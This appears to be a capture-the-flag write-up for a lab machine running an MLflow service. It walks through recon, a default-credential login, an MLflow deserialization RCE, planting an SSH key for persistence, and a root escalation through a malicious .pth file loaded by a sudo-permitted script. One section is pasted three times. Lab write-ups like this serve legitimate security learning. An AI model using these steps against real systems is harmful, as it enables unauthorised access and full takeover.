```bash
════════════════════════════════════════════════════════
  RECON SUMMARY                                           
  ════════════════════════════════════════════════════════

  Target:        10.129.44.111
  DNS:           smarthire.htb
  HTTP:          80
  HTTPS:         none
  Generated:     2026-05-20 05:40:43

  ────────────────────────────────────────────────────────
  OPEN PORTS & SERVICES
  ────────────────────────────────────────────────────────
  PORT         STATE      SERVICE          VERSION
  ────────────────────────────────────────────────────────
  22/tcp       open       ssh              OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
  80/tcp       open       http             nginx 1.18.0 (Ubuntu)

  ────────────────────────────────────────────────────────
  SUBDOMAINS  (1 found)
  ────────────────────────────────────────────────────────
  → models.smarthire.htb

  ────────────────────────────────────────────────────────
  INTERESTING PATHS  (9 found)
  ────────────────────────────────────────────────────────

  [ http://models.smarthire.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  200      /health

  [ http://smarthire.htb ]
  STATUS   PATH
  ──────────────────────────────────────────────────
  200      /
  200      /login
  200      /register
  200      /static/images/unsplash_analytics.jpeg
  200      /static/images/unsplash_robohuman.jpeg
  200      /static/images/unsplash_team.jpeg
  200      /static/js/tailwind.js
  302      /login

  ════════════════════════════════════════════════════════
  ```

  WE have ssh and a website on port 80. Also a subdomain called "models". There was a way to register and login to the website. We are able to upload hiring data in csv format to the website. It also gives us a format guide which is helpful.
Let's check out the models subdomain. Ok so it asks for credentials. I tried googling for default credentials but they didnt work but after a while i was able to log in with admin:password. Great security.

```bash
MLflow 2.14.1 is heavily impacted by a critical suite of unsafe deserialization and Remote Code Execution (RCE) vulnerabilities. These flaws generally exist because MLflow's PyFunc components utilize cloudpickle or Python's native pickle module to load untrusted model artifacts, enabling arbitrary code execution.
```

I searched for a poc for this exploit and i was able to find one. Now we just execute it and we get a shell

```bash
svcweb@smarthire:/var/www/smarthire.htb$ id
id
uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)
```

Here we are able to read the flag. Now we need to find a way to escalate our privileges

Let's add our key to the authorized_keys file so we are able to log in via ssh to make the experience better

```bash
svcweb@smarthire:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1re+d17VVZdCD4/8IELSmuhMUpbD1qUlNm riku@gmail.com" > authorized_keys
```

Then we can just ssh without any passwords


```bash
ssh svcweb@smarthire.htb        
The authenticity of host 'smarthire.htb (10.129.1.172)' can't be established.
ED25519 key fingerprint is: SHA256:eIBuWQhRmbLzOYVJvpUmSQN5qZ/ZcwoK125zwEYBd48
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'smarthire.htb' (ED25519) to the list of known hosts.
Last login: Thu May 21 14:13:48 2026 from 10.10.14.38
svcweb@smarthire:~$ 
```

We are able to run something as sudo

```bash
sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

I read through the code and the plugins seem like our way out. I checked the plugins directory and we are in the "dev" group so we are able to write here which is great. 


We are able to run something as sudo

```bash
sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

I read through the code and the plugins seem like our way out. I checked the plugins directory and we are in the "dev" group so we are able to write here which is great. 


We are able to run something as sudo

```bash
sudo -l
Matching Defaults entries for svcweb on smarthire:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User svcweb may run the following commands on smarthire:
    (root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

I read through the code and the plugins seem like our way out. I checked the plugins directory and we are in the "dev" group so we are able to write here which is great. 

```bash
PLUGINS_DIR = BASE_DIR / "plugins"

for path in PLUGINS_DIR.iterdir():
    if path.is_dir():
        site.addsitedir(str(path))
```

This part was vulnerable. The python starts searching for modules here. But the privescalation happens when it also searches for .pth files. They are handled automatically so we can make a malicious one.

for example
```bash
import os; os.system("/bin/bash -p")
```

and then when we execute the entire thing

```bash
echo 'import os; os.system("/bin/bash -p")' > /opt/tools/mlflow_ctl/plugins/dev/rootme.pth
svcweb@smarthire:~$ sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
root@smarthire:/home/svcweb# cat /root/root.txt
d4f2b3479d8dd3af881764238267
```
